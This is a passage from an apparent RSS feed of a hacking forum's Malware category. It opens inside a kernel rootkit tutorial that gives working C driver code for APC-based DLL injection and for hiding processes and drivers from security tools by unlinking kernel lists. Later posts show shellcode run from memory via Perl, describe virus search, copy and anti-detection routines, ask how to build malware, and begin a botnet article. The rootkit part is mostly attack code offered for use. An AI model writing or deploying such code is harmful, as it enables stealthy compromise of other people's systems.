<p>These code snippets are instrumental in monitoring and responding to the loading of <code>kernel32.dll</code> and lay the groundwork for our upcoming discussion on kernel-mode DLL injection.</p>
<h3><a name="unloading-the-driver-28" class="anchor" href="https://0x00sec.org#unloading-the-driver-28"></a>Unloading the Driver</h3>
<p>Before we dive deeper into DLL injection, it’s essential to understand how the driver can be unloaded properly. We accomplish this using the <code>Unload</code> function.</p>
<pre><code class="lang-c">VOID Unload(IN PDRIVER_OBJECT pDriverobject)
{
    // Remove the image load notification routine
    PsRemoveLoadImageNotifyRoutine(&amp;LoadImageNotifyRoutine);
}
</code></pre>
<p>Here, we use the <code>PsRemoveLoadImageNotifyRoutine</code> function to unregister the previously registered image load notification routine. This step ensures that we can gracefully clean up and stop monitoring loaded images when the driver is unloaded.</p>
<h3><a name="dll-injection-29" class="anchor" href="https://0x00sec.org#dll-injection-29"></a>DLL Injection</h3>
<p>Our exploration of kernel-mode DLL injection is incomplete without understanding how the actual injection takes place. The <code>DllInject</code> function is the key to achieving this.</p>
<pre><code class="lang-c">NTSTATUS DllInject(HANDLE ProcessId, PEPROCESS Peprocess, PETHREAD Pethread, BOOLEAN Alert)
{
    HANDLE hProcess;
    OBJECT_ATTRIBUTES oa = { sizeof(OBJECT_ATTRIBUTES) };
    CLIENT_ID cidprocess = { 0 };
    CHAR DllFormatPath[] = "C:\\foo.dll";
    ULONG Size = strlen(DllFormatPath) + 1;
    PVOID pvMemory = NULL;

    cidprocess.UniqueProcess = ProcessId;
    cidprocess.UniqueThread = 0;

    // Open the target process
    if (NT_SUCCESS(ZwOpenProcess(&amp;hProcess, PROCESS_ALL_ACCESS, &amp;oa, &amp;cidprocess)))
    {
        // Allocate virtual memory in the target process
        if (NT_SUCCESS(ZwAllocateVirtualMemory(hProcess, &amp;pvMemory, 0, &amp;Size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)))
        {
            // Create an APC (Asynchronous Procedure Call) to load the DLL
            KAPC_STATE KasState;
            PKAPC Apc;

            // Attach to the target process
            KeStackAttachProcess(Peprocess, &amp;KasState);

            // Copy the DLL path to the target process's memory
            strcpy(pvMemory, DllFormatPath);

            // Detach from the target process
            KeUnstackDetachProcess(&amp;KasState);

            // Allocate memory for the APC
            Apc = (PKAPC)ExAllocatePool(NonPagedPool, sizeof(KAPC));
            if (Apc)
            {
                // Initialize the APC with the appropriate routine and parameters
                KeInitializeApc(Apc, Pethread, 0, (PKKERNEL_ROUTINE)APCKernelRoutine, 0, (PKNORMAL_ROUTINE)Hash.pvLoadLibraryExA, UserMode, pvMemory);

                // Insert the APC into the thread's queue
                KeInsertQueueApc(Apc, 0, 0, IO_NO_INCREMENT);
                return STATUS_SUCCESS;
            }
        }
        // Close the target process handle
        ZwClose(hProcess);
    }

    return STATUS_NO_MEMORY;
}

</code></pre>
<p>The <code>DllInject</code> function serves the critical role of injecting a DLL into a target process in kernel mode. It accepts several parameters, including the <code>ProcessId</code> of the target process, the <code>PEPROCESS</code> structure of the target process (<code>Peprocess</code>), the <code>PETHREAD</code> structure of the target process (<code>Pethread</code>), and a Boolean value indicating whether alertable I/O is allowed (<code>Alert</code>).</p>
<p>The injection process begins with the opening of the target process using <code>ZwOpenProcess</code>. This step grants us access to the target process with full privileges.</p>
<p>Subsequently, we allocate virtual memory within the target process using <code>ZwAllocateVirtualMemory</code>. This allocated memory will be used to store the path to the DLL that we intend to inject.</p>
<p>To safely write data into the target process’s memory, we attach to the target process using <code>KeStackAttachProcess</code>. This attachment is crucial for the integrity and safety of the DLL injection process.</p>
<p>With the attachment in place, we copy the path of the DLL to be injected into the allocated virtual memory within the target process. This path is defined in the <code>DllFormatPath</code> variable.</p>
<p>After successfully copying the DLL path, we detach from the target process using <code>KeUnstackDetachProcess</code>.</p>
<p>The heart of the DLL injection lies in the creation of an Asynchronous Procedure Call (APC). This is accomplished by allocating memory for the APC using <code>ExAllocatePool</code>. The APC is initialized with the necessary routine and parameters.</p>
<ul>
<li>The <code>Apc</code> structure is initialized using <code>KeInitializeApc</code>.</li>
<li>The parameters include the target thread (<code>Pethread</code>) and an APC routine (<code>APCKernelRoutine</code>) responsible for loading the DLL.</li>
<li>Additionally, the normal routine is specified as <code>Hash.pvLoadLibraryExA</code> to load the DLL using <code>LoadLibraryExA</code> from <code>kernel32.dll</code>.</li>
<li>The APC is inserted into the thread’s queue with <code>KeInsertQueueApc</code>.</li>
</ul>
<p>To ensure that DLL injection occurs in a controlled and synchronized manner, we rely on the <code>SirifefWorkerRoutine</code> and <code>APCInjectorRoutine</code> functions.</p>
<pre><code class="lang-c">VOID SirifefWorkerRoutine(PVOID Context)
{
    DllInject(((PSIRIFEF_INJECTION_DATA)Context)-&gt;ProcessId, ((PSIRIFEF_INJECTION_DATA)Context)-&gt;Process, ((PSIRIFEF_INJECTION_DATA)Context)-&gt;Ethread, FALSE);
    KeSetEvent(&amp;((PSIRIFEF_INJECTION_DATA)Context)-&gt;Event, (KPRIORITY)0, FALSE);
    return;
}
</code></pre>
<p>The <code>SirifefWorkerRoutine</code> function acts as a worker routine responsible for triggering the DLL injection. It accepts a single <code>Context</code> parameter.</p>
<p>Within this function, the actual DLL injection is initiated by calling the <code>DllInject</code> function. The parameters provided include the target process’s ID, the process’s <code>EPROCESS</code> structure, and the process’s <code>ETHREAD</code> structure. The final parameter, <code>FALSE</code>, indicates that alertable I/O is not allowed.</p>
<p>Once the DLL injection process completes, an event (<code>KeSetEvent</code>) is set to signal the successful injection. This event allows us to synchronize the completion of the injection process with other parts of the code.</p>
<h3><a name="dll-injection-via-apc-30" class="anchor" href="https://0x00sec.org#dll-injection-via-apc-30"></a>DLL Injection via APC</h3>
<p>The initiation of DLL injection takes place within the <code>APCInjectorRoutine</code> function, The <code>APCInjectorRoutine</code> function serves as the orchestrator for our DLL injection process. It commences by initializing a <code>SIRIFEF_INJECTION_DATA</code> structure, <code>Sf</code>, and scheduling a worker thread (<code>SirifefWorkerRoutine</code>) to perform the injection.</p>
<pre><code class="lang-c">VOID NTAPI APCInjectorRoutine(PKAPC Apc, PKNORMAL_ROUTINE *NormalRoutine, PVOID *SystemArgument1, PVOID *SystemArgument2, PVOID* Context)
{
    SIRIFEF_INJECTION_DATA Sf;

    RtlSecureZeroMemory(&amp;Sf, sizeof(SIRIFEF_INJECTION_DATA));
    ExFreePool(Apc);

    // Initialize the SIRIFEF_INJECTION_DATA structure with the necessary information
    Sf.Ethread = KeGetCurrentThread();
    Sf.Process = IoGetCurrentProcess();
    Sf.ProcessId = PsGetCurrentProcessId();

    // Initialize an event to synchronize the DLL injection
    KeInitializeEvent(&amp;Sf.Event, NotificationEvent, FALSE);

    // Initialize a work item to execute the SirifefWorkerRoutine
    ExInitializeWorkItem(&amp;Sf.WorkItem, (PWORKER_THREAD_ROUTINE)SirifefWorkerRoutine, &amp;Sf);

    // Queue the work item to be executed on the DelayedWorkQueue
    ExQueueWorkItem(&amp;Sf.WorkItem, DelayedWorkQueue);

    // Wait for the DLL injection to complete
    KeWaitForSingleObject(&amp;Sf.Event, Executive, KernelMode, TRUE, 0);

    return;
}

</code></pre>
<p>These routines work together to schedule and execute the DLL injection into the target process after the <code>kernel32.dll</code> module is loaded. This injection is performed in a controlled and synchronized manner, ensuring that the target process is injected with the specified.</p>
<h3><a name="hide-process-31" class="anchor" href="https://0x00sec.org#hide-process-31"></a>Hide Process</h3>
<p>A interesting technique we can use in our rootkit is to hide or unlink a target process, which will be hidden from AVs,  We won’t be able to see this in the Windows Task Manager.</p>
<p>To hide our process we need to understand a few Windows internal concepts, such as the <code>EPROCESS</code> data structure in the Windows kernel. <code>EPROCESS</code> is an opaque data structure in the Windows kernel that contains important information about processes running on the system. The offsets of this large structure change from build to build or version to version.</p>
<p>What we’re interested in is, <code>ActiveProcessLinks</code>, which is a pointer to a structure called <code>LIST_ENTRY</code>. We can’t just access this data structure normally like <code>EPROCESS.ActiveProcessLinks</code>, we have to use <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-psgetcurrentprocessid" rel="noopener nofollow ugc">PsGetCurrentProcess</a> to get the current <code>EPROCESS</code> and then add an offset that is version dependent. This is the downside to the <code>EPROCESS</code> structure. It can make it very hard to have a compatible Windows Kernel rootkit.</p>
<pre><code class="lang-auto">kd&gt; dt nt!_EPROCESS
&lt;..redacted...&gt;
    +0x000 Pcb              : _KPROCESS
    +0x3e8 ProcessLock      : _EX_PUSH_LOCK
    +0x2f0 UniqueProcessId  : Ptr64 Void
    +0x400 ActiveProcessLinks : _LIST_ENTRY
</code></pre>
<p>The <code>LIST_ENTRY</code> data structure is a doubly-linked list, where <code>FLINK</code> (forward link) and <code>BLINK</code> are references to the next and previous elements in the doubly-linked list.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/c/c/ccd2ee6f9d86b1a37e534d272e9834b669bb0616.png" data-download-href="/uploads/short-url/tdXjZgZaIqarhbexg3YcR2oWNM2.png?dl=1" title="img" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/c/c/ccd2ee6f9d86b1a37e534d272e9834b669bb0616.png" alt="img" data-base62-sha1="tdXjZgZaIqarhbexg3YcR2oWNM2" width="690" height="178" data-dominant-color="ECECEC"></a></div><p></p>
<p>Using the information above, we can hide our process from being shown by manipulating the kernel data structures. To hide our process we can do the following:</p>
<ul>
<li>Point the <code>ActiveProcessLinks.FLINK</code> of <code>EPROCESS 1</code> to <code>ActiveProcessLinks.FLINK</code> of <code>EPROCESS 3</code> .</li>
<li>Point <code>ActiveProcessLinks.BLINK</code> of <code>EPROCESS 3</code> to <code>ActiveProcessLinks.BLINK</code> OF <code>EPROCESS 1</code>.</li>
</ul>
<p>This manipulation unlinks the data structure of our target process, <code>EPROCESS 2</code>, from the doubly-linked list, rendering it invisible to system inspectors.</p>
<pre><code class="lang-c">// Function to hide a process by manipulating kernel data structures
NTSTATUS HideProcess(ULONG pid) {
    PEPROCESS currentEProcess = PsGetCurrentProcess();
    LIST_ENTRY* currentList = &amp;currentEProcess-&gt;ActiveProcessLinks;
    
    // Get the offsets for UniqueProcessId and ActiveProcessLinks
    ULONG uniqueProcessIdOffset = FIELD_OFFSET(EPROCESS, UniqueProcessId);
    ULONG activeProcessLinksOffset = FIELD_OFFSET(EPROCESS, ActiveProcessLinks);
    
    ULONG currentPid;
    
    do {
        // Check if the current process ID is the one to hide
        RtlCopyMemory(&amp;currentPid, (PUCHAR)currentEProcess + uniqueProcessIdOffset, sizeof(currentPid));
        if (currentPid == pid) {
            // Remove the process from the list
            LIST_ENTRY* blink = currentList-&gt;Blink;
            LIST_ENTRY* flink = currentList-&gt;Flink;
            blink-&gt;Flink = flink;
            flink-&gt;Blink = blink;
            return STATUS_SUCCESS;
        }
        
        // Move to the next process
        currentList = currentList-&gt;Flink;
        currentEProcess = CONTAINING_RECORD(currentList, EPROCESS, ActiveProcessLinks);
    } while (currentList != &amp;currentEProcess-&gt;ActiveProcessLinks);
    
    return STATUS_NOT_FOUND;  // Process not found
}
</code></pre>
<p><code>HideProcess</code>, which hides a process using the DKOM technique. It takes the Process ID (PID) of the target process as an argument. Here’s how it works:</p>
<ol>
<li>It starts by obtaining the current <code>EPROCESS</code> structure for the executing driver using <code>PsGetCurrentProcess</code>.</li>
<li>The code then retrieves the offsets within the <code>EPROCESS</code> structure for <code>UniqueProcessId</code> and <code>ActiveProcessLinks</code>.</li>
<li>It iterates through the list of active processes, comparing the PID of each process with the target PID. When it finds a match, it unlinks the process from the <code>ActiveProcessLinks</code> list, effectively hiding it.</li>
<li>The function returns <code>STATUS_SUCCESS</code> if it successfully hides the process. If the target process is not found, it returns <code>STATUS_NOT_FOUND</code>.</li>
</ol>
<h3><a name="hiding-a-driver-32" class="anchor" href="https://0x00sec.org#hiding-a-driver-32"></a>Hiding a Driver</h3>
<p>In addition to hiding processes, we can also employ the DKOM technique to hide drivers from the system. This is particularly useful in scenarios where a rootkit needs to remain undetected</p>
<pre><code class="lang-c">// Function to hide a driver by manipulating data structures
NTSTATUS HideDriver(PDRIVER_OBJECT driverObject) {
    KIRQL irql;
    
    // Raise IRQL to DPC level
    irql = KeRaiseIrqlToDpcLevel();
    
    // Get the module entry from the DriverObject
    PLDR_DATA_TABLE_ENTRY moduleEntry = (PLDR_DATA_TABLE_ENTRY)driverObject-&gt;DriverSection;
    
    // Unlink the module entry
    moduleEntry-&gt;InLoadOrderLinks.Blink-&gt;Flink = moduleEntry-&gt;InLoadOrderLinks.Flink;
    moduleEntry-&gt;InLoadOrderLinks.Flink-&gt;Blink = moduleEntry-&gt;InLoadOrderLinks.Blink;
    
    // Lower IRQL back to its original value
    KeLowerIrql(irql);
    
    return STATUS_SUCCESS;
}

</code></pre>
<p><code>HideDriver</code> function is designed to hide a driver by manipulating kernel data structures. Here’s a breakdown of how it works:</p>
<ol>
<li>It raises the IRQL (Interrupt Request Level) to DPC (Deferred Procedure Call) level using <code>KeRaiseIrqlToDpcLevel</code>. This is essential to ensure that the manipulation of kernel data structures is performed atomically and doesn’t interfere with ongoing system operations.</li>
<li>Next, it obtains the module entry by casting the <code>DriverSection</code> member of the provided <code>driverObject</code> to a <code>PLDR_DATA_TABLE_ENTRY</code>. This provides access to information about the driver module.</li>
<li>It unlinks the module entry from the kernel’s internal linked lists. By manipulating the <code>InLoadOrderLinks</code> member of the module entry, it effectively removes the driver from the list of loaded modules.</li>
<li>Finally, it lowers the IRQL back to its original value using <code>KeLowerIrql</code>, allowing normal system operation to resume.</li>
</ol>
<h1><a name="conclusion-33" class="anchor" href="https://0x00sec.org#conclusion-33"></a>Conclusion</h1>
<p>Thank you for reading, and I hope you’ve learned something from this. We’ve covered a lot of topics. I removed the shellcode development section to keep things simpler, which I may cover in a separate article. I’ve included great resources that helped create this article. Remember,</p>
<p>" Social engineering and phishing, combined with some operative knowledge about windows hacking, should be enough to get you inside the networks of most organization"</p>
<h2><a name="references-and-credits-34" class="anchor" href="https://0x00sec.org#references-and-credits-34"></a>References and Credits</h2>
<p><a href="https://ntopcode.wordpress.com/2018/02/26/anatomy-of-the-process-environment-block-peb-windows-internals/" rel="noopener nofollow ugc"> Anatomy of the Process Environment Block (PEB) (Windows Internals</a></p>
<p><a href="https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/manipulating-activeprocesslinks-to-unlink-processes-in-userland" rel="noopener nofollow ugc">Manipulating Active processlinks</a></p>
<p><a href="https://www.ired.team/offensive-security/code-injection-process-injection/dll-injection" rel="noopener nofollow ugc"> DLL Injection</a></p>
<p><a href="https://memn0ps.github.io/kernel-mode-rootkits/" rel="noopener nofollow ugc">Kernel Mode Rootkits</a></p>
<p><a href="https://www.ired.team/offensive-security/defense-evasion/finding-all-rwx-protected-memory-regions" rel="noopener nofollow ugc">Enumerating RWX Protected Memory Regions for Code Injection</a></p>
<p><a href="https://www.drmaster.com.tw/Bookinfo.asp?BookID=MP22111" rel="noopener nofollow ugc">Windows APT Warfare</a></p>
            <p><small>10 posts - 10 participants</small></p>
            <p><a href="https://0x00sec.org/t/malware-development-essentials-for-operators/37769">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/malware-development-essentials-for-operators/37769</link>
          <pubDate>Wed, 08 Nov 2023 02:33:14 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-37769</guid>
          <source url="https://0x00sec.org/t/malware-development-essentials-for-operators/37769.rss">Malware Development Essentials for Operators</source>
        </item>
        <item>
          <title>Seeking Guidance on Writing a Malware Builder</title>
          <dc:creator><![CDATA[Plogoman]]></dc:creator>
          <category>Malware</category>
          <description><![CDATA[
            <p>Hello everyone,</p>
<p>I hope you are all doing well. I am currently working on a project for educational purposes and would like to learn more about writing a malware builder. While I understand the concerns and ethical implications associated with malware, I believe that understanding its mechanics can help improve security measures. I am not interested in engaging in any malicious activities, but rather in expanding my knowledge about cybersecurity.</p>
<p>I would greatly appreciate it if anyone could guide me on the process of creating a malware builder or provide resources to help me get started. I am interested in understanding the techniques used, the underlying code, and the potential countermeasures. My intention is solely for educational purposes and to learn how to defend against such threats effectively.</p>
<p>Thank you in advance for your support and understanding.</p>
            <p><small>4 posts - 4 participants</small></p>
            <p><a href="https://0x00sec.org/t/seeking-guidance-on-writing-a-malware-builder/37630">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/seeking-guidance-on-writing-a-malware-builder/37630</link>
          <pubDate>Sun, 29 Oct 2023 10:22:25 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-37630</guid>
          <source url="https://0x00sec.org/t/seeking-guidance-on-writing-a-malware-builder/37630.rss">Seeking Guidance on Writing a Malware Builder</source>
        </item>
        <item>
          <title>Executing assembly/shellcode on-the-fly with Perl</title>
          <dc:creator><![CDATA[isra]]></dc:creator>
          <category>Malware</category>
          <description><![CDATA[
            <h2>Introduction</h2>
<p>
This post describes a simple trick to copy arbitrary assembly/shellcode (Linux x86_64) into a mapped memory address and then execute it on-the-fly as if it were an external subroutine, no compiling or extra tools needed (based on <a href="https://hckng.org/articles/perlhacking-I-peek-poke-xsub.html" target="_blank" rel="noopener nofollow ugc"> Perl hacking I: PEEK &amp; POKE &amp; XSUB</a>). 
</p>
<h2>Copying payload into memory</h2>
<p>
Two things are needed for copying an assembly/shellcode payload into memory: a temporary file with the given payload and two syscalls to map a new memory area and read the temporary file's content into such area. Let's consider the following assembly code which executes /usr/bin/id with execve:
</p>
<pre><code class="lang-auto">BITS 64
 global main
 section .text
 main:
    call run
    db "/usr/bin/id", 0x0

 run:
    ;;;;;;;;;;;;;;;;;;;;;;;;;
    ; call id
    ;;;;;;;;;;;;;;;;;;;;;;;;;
    pop rsi
    pop rsi ; twice to remove garbage when called from Perl

    xor rax, rax
    lea rdi, [rsi]
    
    ; argv
    ; ["/usr/bin/id"]
    push 0
    push rdi          ; "/usr/bin/id"
    mov rsi, rsp 

    ; execve &amp; exit
    xor rax, rax
    mov rax, 59
    mov rdx, 0
    syscall
    pop rsi
    xor rdx, rdx
    mov rax, 60
    syscall
</code></pre>
<p>Compile it and extract its hexadecimal representation:</p>
<pre><code class="lang-auto">$ nasm -f elf64 id.s -o id.o
$ objcopy -O binary -j .text id.o id
$ od -An -v -t x1 id &gt; idhex
$ cat idhex
 e8 0c 00 00 00 2f 75 73 72 2f 62 69 6e 2f 69 64
 00 5e 48 31 c0 48 8d 3e 6a 00 57 48 89 e6 48 31
 c0 b8 3b 00 00 00 ba 00 00 00 00 0f 05 5e 48 31
 d2 b8 3c 00 00 00 0f 05
</code></pre>
<p>Modify the second byte by adding 1 (from 0c to 0d). This is to prevent an rsi full of garbage when executing the payload from Perl. Include the hexadecimal payload in the script and write it to a file:</p>
<pre><code class="lang-auto"># payload to execute /usr/bin/id with execve (x86_64)
my $p = "";
$p .= "\xe8\x0d\x00\x00\x00\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x69";
$p .= "\x64\x00\x5e\x5e\x48\x31\xc0\x48\x8d\x3e\x6a\x00\x57\x48\x89";
$p .= "\xe6\x48\x31\xc0\xb8\x3b\x00\x00\x00\xba\x00\x00\x00\x00\x0f";
$p .= "\x05\x5e\x48\x31\xd2\xb8\x3c\x00\x00\x00\x0f\x05";

my $f = "p";
open my $fh, '&gt;', $f;
syswrite($fh, $p);
</code></pre>
<p>Then use the mmap, open and read syscalls to map a new memory area, open the temporary file and read its content into the buffer starting at the mapped memory area:</p>
<pre><code class="lang-auto">my $sz = (stat $f)[7];

# mmap syscall number 9
# 0 to let the system choose the start of the mapped area
# 3 for PROT_READ | PROT_WRITE
# 33 for MAP_SHARED | MAP_ANONYMOUS
# -1 and 0 to avoid the use of files
my $ptr = syscall(9, 0, $sz, 3, 33, -1, 0);
if($ptr == -1) {
    die "failed to map memory\n";
}

# open syscall number 2
# 0 for read only flag
my $fd = syscall(2, $f, 0);

# read syscall number 0
# use $ptr as buffer
my $bytes = syscall(0, $fd, $ptr, $sz);
if($bytes == -1) {
	die "failed to read payload file\n"
}
</code></pre>
<h2>Executing assembly/shellcode payload</h2>
<p>
To executed the payload first the protection of the mapped memory area needs to be updated to allow execution (using mprotect):
</p><pre><code class="lang-auto"># mprotect syscall number 10
# 5 for PROT_READ | PROT_EXEC
my $ret = syscall(10, $ptr, $sz, 5);
if($ret == -1) {
    die "failed to update memory protection\n";
}
</code></pre>
<p>Then dl_install_xsub() from DynaLoader (standard module) is used to create a new Perl external subroutine based on the parameters $perl_name and $symref and obtain a reference to the “installed function”. The parameter $symref is expected to be a pointer to the function which implements the routine<br>
to be installed, however, a pointer to the payload copied into memory can be used instead. Then a simple call to the dereferenced function executes the payload:</p>
<pre><code class="lang-auto">my $x = DynaLoader::dl_install_xsub("", $ptr);
&amp;{$x};
</code></pre>
<p><a href="https://github.com/ilv/misc/blob/main/exec_asm64-read.pl" target="_blank" rel="noopener nofollow ugc">Example</a>:</p>
<pre><code class="lang-auto">$ perl exec_asm64-read.pl
...
[+] Trying to write payload to a temporary file...OK
[+] Payload size: 57
[+] Trying to map new memory area...OK
[+] Start of mapped area: 0x7fefdda14000
[+] Trying to write payload at 0x7fefdda14000...OK
[+] Trying to update memory protection...OK
[+] Trying to install xsub...OK
[+] Going to execute:

uid=1000(isra) gid=1000(isra)...
</code></pre>
<p>A redacted version of the code looks like this (no checks, etc):</p>
<pre><code class="lang-auto">use DynaLoader;

$p  = "\xe8\x0d\x00\x00\x00\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x69";
$p .= "\x64\x00\x5e\x5e\x48\x31\xc0\x48\x8d\x3e\x6a\x00\x57\x48\x89";
$p .= "\xe6\x48\x31\xc0\xb8\x3b\x00\x00\x00\xba\x00\x00\x00\x00\x0f";
$p .= "\x05\x5e\x48\x31\xd2\xb8\x3c\x00\x00\x00\x0f\x05";

$f = "p";
open $fh, '&gt;', $f;
syswrite($fh, $p);

$sz = (stat $f)[7];
$ptr = syscall(9, 0, $sz, 3, 33, -1, 0);     # mmap
$fd = syscall(2, $f, 0);                     # open
syscall(0, $fd, $ptr, $sz);                  # read
syscall(10, $ptr, $sz, 5);                   # mprotect
$x = DynaLoader::dl_install_xsub("", $ptr);
&amp;{$x};
</code></pre>
<h2>Final words</h2>
The execution of assembly/shellcode with Perl opens up the door for various interesting things, considering that no compilation is needed and Perl is available by default on almost all (if not all) Linux distributions. For example, you can take a look at <a href="https://github.com/ilv/exploits/blob/main/looney.pl" target="_blank" rel="noopener nofollow ugc">looney.pl</a>, an exploit for CVE-2023-4911 "Looney Tunables". The script uses Perl for obtaining the necessary data from the system and then executes an assembly/shellcode payload to call "usr/bin/su --help" using execve with a crafted envp. In this case looney.pl uses a more complicated mechanism for copying data into memory but it's the same idea at the end.
<p>Stay tuned, more stuff is coming soon!</p>
            <p><small>2 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/executing-assembly-shellcode-on-the-fly-with-perl/37586">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/executing-assembly-shellcode-on-the-fly-with-perl/37586</link>
          <pubDate>Thu, 26 Oct 2023 18:49:17 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-37586</guid>
          <source url="https://0x00sec.org/t/executing-assembly-shellcode-on-the-fly-with-perl/37586.rss">Executing assembly/shellcode on-the-fly with Perl</source>
        </item>
        <item>
          <title>Computer virus programming in assembley part 1</title>
          <dc:creator><![CDATA[blc_chef]]></dc:creator>
          <category>Malware</category>
          <description><![CDATA[
            <p>This is a tribute to Dr Mark A. Ludwig, he past on in 2011  and we are going to redo his work, update it, provide it in modern programming languages and even extend it by writing articles here and video lectures on youtube .</p>
<p><strong>COMPUTER VIRUSES</strong></p>
<p>A computer virus is a type of malware that, when executed, replicates itself by modifying other computer programs and inserting its own code into those programs.If this replication succeeds, the affected areas are then said to be “infected” with a computer virus, a metaphor derived from biological viruses.</p>
<p>Among the most sophisticated computer programmers, a virus is the weapon of choice for deploying destructive code.The essential feature of a computer program to be classified a computer virus is not its ability to destroy data, but its ability to gain control of the computer and make a fully functional copy of itself. It can reproduce when executed, it makes one or more copies of it’s self.Those copies may later be executed, to create more copies.</p>
<p>Note:  Not all computer programs that are destructive are classified as viruses because they do not reproduce and not all viruses are destructive because reproduction is not destructive</p>
<p>TYPES OF COMPUTER VIRUSES<br>
Viruses which infect any application program.<br>
Viruses which infect a specific file.<br>
Boot sector viruses</p>
<p>THE FUNCTIONAL ELEMENTS OF A VIRUS</p>
<p>Every viable computer virus must have at least two basic parts if it is to be called a virus.</p>
<ol>
<li>
<p>It must contain a search routine, which locates new files or new areas on disk which are worthwhile targets for infection.This routine will determine how well the virus reproduces. eg whether it does so quickly or slowly, whether it can infect multiple disks or a single disk, and if it can infect every portion f a disk or just certain specific areas. As with all programs, there is a size vs functionality tradeoff here. The more sophisticated the search routine is , the more space it will take up. so although an efficient search routine is beneficial for the virus to spread faster, it will make the virus bigger and that is not good.</p>
</li>
<li>
<p>A computer virus must contain a routine to copy itself into the areas which the search routine locates. The copy routine will only be sophisticated enough to do it’s job without being caught. The smaller it is, the better.</p>
</li>
</ol>
<p>Example a virus which infects only COM files can get by with a small copy routine than a virus which infects EXE files.This is because the EXE file structure is more complex, so the virus needs to do more to attach its self to an EXE file.</p>
<pre><code>While the virus only needs to be able to locate suitable hosts and attach itself to them, it is usually helpful to incorporate some additional functionality into the virus like, anti-detection either by the computer user or anti virus programs.Eg the search routine maybe limited in scope to avoid detection. A routine which checked every file on the disk without limit would take long time and cause enough unusual disk activity.Anti detection features may cause the virus to be dormant under certain special conditions. Eg it might activate only after a certain date.
</code></pre>
<p>It might activate only if a key has not been pressed for five minutes(suggesting that the user was not there watching his computer)</p>
<p>Note: Search, copy and anti-detection routines are the only necessary components of a computer virus.</p>
            <p><small>2 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/computer-virus-programming-in-assembley-part-1/37308">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/computer-virus-programming-in-assembley-part-1/37308</link>
          <pubDate>Sun, 08 Oct 2023 20:30:12 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-37308</guid>
          <source url="https://0x00sec.org/t/computer-virus-programming-in-assembley-part-1/37308.rss">Computer virus programming in assembley part 1</source>
        </item>
        <item>
          <title>All About computer viruses</title>
          <dc:creator><![CDATA[blc_chef]]></dc:creator>
          <category>Malware</category>
          <description><![CDATA[
            <p>Hello members  as a contribution to the forum, am going to be creating post series about computer viruses, everything ffrom the basics to expert level about them so i hope you enjoy</p>
            <p><small>8 posts - 6 participants</small></p>
            <p><a href="https://0x00sec.org/t/all-about-computer-viruses/37238">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/all-about-computer-viruses/37238</link>
          <pubDate>Wed, 04 Oct 2023 12:53:44 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-37238</guid>
          <source url="https://0x00sec.org/t/all-about-computer-viruses/37238.rss">All About computer viruses</source>
        </item>
        <item>
          <title>Malware Development: Botnet-Based</title>
          <dc:creator><![CDATA[0xf00I]]></dc:creator>
          <category>Malware</category>
          <description><![CDATA[
            <p>Here’s <a class="mention" href="https://0x00sec.org/u/0xf00">@0xf00</a>, I no longer have access to this account, in a moment of genius, I managed to wipe my one and only backup, However I’ll be sharing articles both here and on github at <a href="http://0xf00I.github.io" rel="noopener nofollow ugc">0xf00I.github.io</a>.</p>
<p>In this article, I will discuss the fundamentals of botnets dev, providing insights into their structure and operation. After stumbling upon a post titled “How does one create an IOT botnet?”, I thought about writing an article covering the fundamentals of botnet project I wrote a long time ago and how vulnerabilities are exploited by worms to propagate through networks. So, let’s start with a simple definition:</p>
<p><strong>What is a Botnet?</strong> In simple terms, a botnet is a network of computers infected by malware and controlled by a single entity or party.</p>
<p>Botnets usually operate through three stages or more. In this article, I’ll go over each stage, explaining how they work, and provide code example. Finally, a detailed explanation, Let’s get started with our exploration of botnets and their inner workings.</p>
<h1><a name="entry-point-1" class="anchor" href="https://0x00sec.org#entry-point-1"></a>Entry Point</h1>
<p>The primary approach involves utilizing spam campaigns, This method is preferred due to its simplicity making it challenging to trace the origin of the initial infection or its source. The attack is mass rather then targeted, So, Typically you get an e-mails contain a malicious attachment that is often referred to as an invoice, and that’s usually the stage 1 of every infection “The malicious macro” a social engineering attempt to lure an unsuspecting victim into executing the payload of the document, In this article we gone wear the black hat and play the role.</p>
<pre data-code-wrap="asm"><code class="lang-plaintext">        Initial Access         Execution              Persistence
             |                      |                      |
             V                      V                      V
[PrintNightmare Exploit] ---&gt; [Malware Injection] ---&gt; [Maintain Control]   

    Command and Control     Actions on Objectives
             |                      |
             V                      V
    [Phone Home to C&amp;C] ---&gt; [Initiate The Attack]   
					                                   Figure 1
</code></pre>
